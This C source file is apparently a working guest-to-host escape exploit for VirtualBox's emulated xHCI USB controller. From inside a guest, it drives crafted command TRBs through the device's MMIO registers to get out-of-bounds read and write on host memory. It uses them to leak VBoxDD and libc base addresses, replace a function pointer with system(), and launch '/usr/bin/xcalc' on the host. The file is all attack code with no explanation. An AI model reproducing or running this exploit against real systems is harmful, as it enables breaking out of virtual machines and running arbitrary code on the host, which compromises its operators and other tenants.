#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <assert.h>

#include <sys/types.h>
#include <sys/mman.h>
#include <sys/io.h>

#include "vbox.exp.h"

volatile uint8_t *data_mem = NULL;
volatile uint8_t *xhci_mmio_mem = NULL;
#define XHCI_MMIO_ADDR 0xcafe000

#define PhysWrite           1
#define PhysRead            0

#define offOpRegs(iReg)     ((iReg << 2) + XHCI_CAPS_REG_SIZE)
#define USBCMD              offOpRegs(0)
#define CRCRL               offOpRegs(6)
#define CRCRH               offOpRegs(7)

typedef struct content {
    uint64_t addr;
    uint32_t off;
    uint32_t len: 31;
    uint32_t flag: 1;
} content_t;

#define PAGE_SHIFT      12
#define PAGE_SIZE       (1 << PAGE_SHIFT)
#define PFN_PRESENT     (1ull << 63)
#define PFN_PFN         ((1ull << 55) - 1)

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    close(fd);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

#define mmio_write64(addr, val) (*(volatile uint64_t *)addr=val)
#define mmio_write32(addr, val) (*(volatile uint32_t *)addr=val)
#define mmio_write16(addr, val) (*(volatile uint16_t *)addr=val)
#define mmio_write8(addr, val)  (*(volatile uint8_t *)addr=val)
#define mmio_read64(addr)       (*(volatile uint64_t *)addr)
#define mmio_read32(addr)       (*(volatile uint32_t *)addr)
#define mmio_read16(addr)       (*(volatile uint16_t *)addr)
#define mmio_read8(addr)        (*(volatile uint8_t *)addr)

void *mmio_init(void *fixed, size_t size, const char *file) {
    void *mem = NULL;

    int mmio_fd = open(file, O_RDWR | O_SYNC);
    if (mmio_fd == -1) {
        perror("[-] failed to open mmio.");
        exit(EXIT_FAILURE);
    }

    mem = mmap(fixed, size, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mem == MAP_FAILED) {
        perror("[-] failed to mmap mmio.");
        exit(EXIT_FAILURE);
    }
    if (mlock(mem, size) == -1) {
        perror("[-] failed to mlock mmio_mem.");
        exit(EXIT_FAILURE);
    }

    close(mmio_fd);
    return mem;
}

void hex_dump64(void* buf, size_t len) {
    uint64_t *p = (uint64_t *)buf;
    uint8_t *end = (uint8_t *)buf + len;

    puts("=====================================");
    if (len >= 0x10) {
        for (; (uint8_t *)(p+2) <= end; p+=2) {
            printf("0x%016lx 0x%016lx\n", p[0], p[1]);
        }
    }
    if (len % 0x10 >= 8) {
        printf("0x%016lx ", p[0]);
        if (len % 0x10 == 8) {
            putchar('\n');
            return;
        }
        p += 1;
    }
    if (len % 8 > 0) {
        uint64_t tmp = 0;
        for (size_t i = len % 8; i > 0; i--) {
            tmp |= p[i];
            tmp <<= 8;
        }
        printf("0x%016lx\n", tmp);
    }
    puts("=====================================");
}

void abwrite(uint8_t *buf, uint32_t off, uint32_t len) {
    XHCI_COMMAND_TRB *cmd = (XHCI_COMMAND_TRB *)data_mem;
    content_t *content = (content_t *)(data_mem + 0x100);

    uint64_t cmd_pa = 0;
    uint64_t content_pa = 0;
    uint32_t res = 0;

    memset(content, 0, sizeof(content_t));
    content->addr = gva_to_gpa(buf);
    content->off = off;
    content->len = len;
    content->flag = PhysRead;
    content_pa = gva_to_gpa(content);

    memset(cmd, 0, sizeof(XHCI_COMMAND_TRB));
    cmd->gen.type = 51;
    cmd->gen.cycle = XHCI_CRCR_RCS;
    cmd->adr.ctx_ptr = content_pa;
    cmd_pa = gva_to_gpa(cmd);
    __sync_synchronize();

    // stop
    mmio_write32((xhci_mmio_mem + USBCMD), 0);
    // set pThis->crcr
    mmio_write32((xhci_mmio_mem + CRCRL), cmd_pa | XHCI_CRCR_RCS);
    // start
    mmio_write32((xhci_mmio_mem + USBCMD), XHCI_CMD_RS);
    // notify
    mmio_write32((xhci_mmio_mem + XHCI_DOORBELL_OFFSET), 0);
    __sync_synchronize();
}

void abread(uint64_t addr, uint32_t off, uint32_t len) {
    XHCI_COMMAND_TRB *cmd = (XHCI_COMMAND_TRB *)data_mem;
    content_t *content = (content_t *)(data_mem + 0x100);

    uint64_t cmd_pa = 0;
    uint64_t content_pa = 0;
    uint32_t res = 0;

    memset(content, 0, sizeof(content_t));
    content->addr = gva_to_gpa(addr);
    content->off = off;
    content->len = len;
    content->flag = PhysWrite;
    content_pa = gva_to_gpa(content);

    memset(cmd, 0, sizeof(XHCI_COMMAND_TRB));
    cmd->gen.type = 51;
    cmd->gen.cycle = XHCI_CRCR_RCS;
    cmd->adr.ctx_ptr = content_pa;
    cmd_pa = gva_to_gpa(cmd);
    __sync_synchronize();

    // stop
    mmio_write32((xhci_mmio_mem + USBCMD), 0);
    // set pThis->crcr
    mmio_write32((xhci_mmio_mem + CRCRL), cmd_pa | XHCI_CRCR_RCS);
    // start
    mmio_write32((xhci_mmio_mem + USBCMD), XHCI_CMD_RS);
    // notify
    mmio_write32((xhci_mmio_mem + XHCI_DOORBELL_OFFSET), 0);
    __sync_synchronize();
}

int main() {
    xhci_mmio_mem = mmio_init((void *)XHCI_MMIO_ADDR, 0x10000, "/sys/devices/pci0000:00/0000:00:0c.0/resource0");
    printf("[*] xhci_mmio_mem: %p\n", xhci_mmio_mem);
    data_mem = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON|MAP_POPULATE, -1, 0);
    printf("[*] data_mem: %p\n", data_mem);

    uint8_t *buf = data_mem + 0x200;
    
    /* leak */
    memset(buf, 0, 0x100);
    abread(buf, -0x13f0, 0x100);
    hex_dump64(buf, 0x100);
    uint64_t vboxdd_base = *(uint64_t *)(buf + 0x30) - 0x7cd280;
    uint64_t pThis = *(uint64_t *)(buf + 0x18);
    uint64_t pDevIns = pThis - 0x440;
    uint64_t rw_base = pThis + 0xfb0;
    printf("[+] vboxdd_base: %#lx\n", vboxdd_base);
    printf("[+] rw_base: %#lx\n", rw_base);

    uint64_t vboxdd_got = vboxdd_base + 0x7D9000;
    memset(buf, 0, 0x100);
    printf("[abread] off %#lx len %#lx\n", vboxdd_got-rw_base, 8);
    abread(buf, vboxdd_got-rw_base, 8);
    hex_dump64(buf, 0x8);
    uint64_t libc_base = *(uint64_t *)buf - 0x79b00;
    printf("[+] libc_base: %#lx\n", libc_base);

    /* exploit */
    uint64_t system_addr = libc_base + 0x4ebf0;
    memset(buf, 0, 0x100);
    *(uint64_t *)buf = system_addr;
    abwrite(buf, 0, 8);

    char *cmd = "/usr/bin/xcalc";
    memset(buf, 0, 0x100);
    memcpy(buf, cmd, strlen(cmd));
    //*(uint64_t *)(buf + 0x10) = rw_base-0x768; // fake pDevIns->CTX_SUFF(pHlp)->pfnPCIPhysWrite
    *(uint64_t *)(buf + 0x10) = rw_base-0x898; // fake pDevIns->CTX_SUFF(pHlp)->pfnCritSectEnter
    abwrite(buf, pDevIns-rw_base, 0x18);

    munmap(data_mem, 0x1000);
    munmap(xhci_mmio_mem, 0x10000);
    return 0;
}

